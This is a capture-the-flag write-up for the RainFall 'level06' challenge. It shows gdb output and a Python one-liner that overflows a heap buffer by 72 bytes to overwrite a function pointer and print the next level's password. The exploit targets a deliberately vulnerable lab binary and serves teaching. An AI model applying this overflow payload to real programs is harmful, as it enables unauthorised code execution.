# level06

The program segfault without parameters and print "Nope" if one is set:

```bash
level6@RainFall:~$ ./level6 
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 csd
Nope
```

We can see 3 functions: main, m and n that is not called. The last one allow us to cat the `.pass` of the level07:

```bash
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x08048454  n
0x08048468  m
0x0804847c  main
```

In the main function, there are two malloc: one of 64 bytes and one of 4 bytes. The second take the address of `m` as value. After, a strcpy from the first parameter of the program to the first malloc is made.
At the end, a call to the function pointed by the 2nd malloc is made.

We can try to overwrite the value of the second malloc.

First, we calculate the length between the address of the 1st malloc and the 2nd. The first is on esp+28, the second on esp+24:

```bash
(gdb) x $esp+0x1c
0xbffff6ec:     0x0804a008
(gdb) x $esp+0x18
0xbffff6e8:     0x0804a050
(gdb) p/d 0x0804a050 - 0x0804a008
$1 = 72
```

We try if a segfault occurs with 72 padding bytes:

```bash
(gdb) r $(python -c 'print "\x41" * 72 + "BBBB"')
Starting program: /home/user/level6/level6 $(python -c 'print "\x41" * 72 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

We can now replace the last four bytes with the address of n:

```bash
level6@RainFall:~$ ./level6 $(python -c 'print "\x41" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
